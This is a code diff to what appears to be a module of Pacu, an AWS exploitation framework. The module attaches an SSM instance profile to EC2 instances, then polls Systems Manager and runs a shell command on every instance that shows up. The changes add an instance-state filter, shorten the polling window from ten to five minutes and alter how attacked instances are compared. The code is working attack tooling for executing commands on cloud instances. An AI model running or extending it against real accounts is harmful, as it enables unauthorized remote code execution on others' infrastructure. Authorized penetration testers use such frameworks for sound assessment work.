@@ -310,26 +310,27 @@ def main(args, pacu_main):
         # total API calls made.
         instances_to_replace = []
         for instance in instances:
-            if instance['Region'] == region:
-                if args.target_instances is not None or args.all_instances is True or instance['ImageId'] in vuln_images:
-                    if 'IamInstanceProfile' in instance:
-                        # The instance already has an instance profile attached, skip it if
-                        # args.replace is not True, otherwise add it to instances_to_replace
-                        if args.replace is True and replace is True:
-                            instances_to_replace.append(instance['InstanceId'])
+            if instance['State']['Name'] == 'running' or instance['State']['Name'] == 'stopped':
+                if instance['Region'] == region:
+                    if args.target_instances is not None or args.all_instances is True or instance['ImageId'] in vuln_images:
+                        if 'IamInstanceProfile' in instance:
+                            # The instance already has an instance profile attached, skip it if
+                            # args.replace is not True, otherwise add it to instances_to_replace
+                            if args.replace is True and replace is True:
+                                instances_to_replace.append(instance['InstanceId'])
+                            else:
+                                print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
+                                pass
                         else:
-                            print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
-                            pass
-                    else:
-                        # There is no instance profile attached yet, do it now
-                        response = client.associate_iam_instance_profile(
-                            InstanceId=instance['InstanceId'],
-                            IamInstanceProfile={
-                                'Name': ssm_instance_profile_name
-                            }
-                        )
-                        targeted_instances.append(instance['InstanceId'])
-                        print('  Instance profile attached to instance ID {}.'.format(instance['InstanceId']))
+                            # There is no instance profile attached yet, do it now
+                            response = client.associate_iam_instance_profile(
+                                InstanceId=instance['InstanceId'],
+                                IamInstanceProfile={
+                                    'Name': ssm_instance_profile_name
+                                }
+                            )
+                            targeted_instances.append(instance['InstanceId'])
+                            print('  Instance profile attached to instance ID {}.'.format(instance['InstanceId']))
         if len(instances_to_replace) > 0 and replace is True:
             # There are instances that need their role replaced, so discover association IDs to make that possible
             all_associations = []
@@ -381,13 +382,13 @@ def main(args, pacu_main):
     print('  Done.\n')
 
     # Start polling SystemsManager/RunCommand to see if instances show up
-    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 10 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 10 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.\n')
+    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 5 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 5 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.\n')
 
-    # Check 20 times in 30 second intervals (10 minutes) or until all targeted instances have been attacked
+    # Check 10 times in 30 second intervals (5 minutes) or until all targeted instances have been attacked
     discovered_instances = []
     attacked_instances = []
     ignored_instances = []
-    for i in range(1, 21):
+    for i in range(1, 11):
         this_check_attacked_instances = []
         for region in regions:
             # Accumulate a list of instances to attack to minimize the amount of API calls being made
@@ -463,18 +464,18 @@ def main(args, pacu_main):
             
         print('  {} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
 
-        if attacked_instances.sort() == targeted_instances.sort():
+        if attacked_instances == targeted_instances:
             # All targeted instances have been attacked, stop polling every 30 seconds
             break
         
         # Don't wait 30 seconds after the very last check
-        if not i == 19:
+        if not i == 10:
             print('Waiting 30 seconds...\n')
             time.sleep(30)
 
-    if i == 19:
-        # We are here because it has been 10 minutes
-        print('It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
+    if i == 10:
+        # We are here because it has been 5 minutes
+        print('It has been 5 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
         print('Successfully attacked the following instances: {}\n'.format(attacked_instances))
     else:
         # We are here because all targeted instances have been attacked
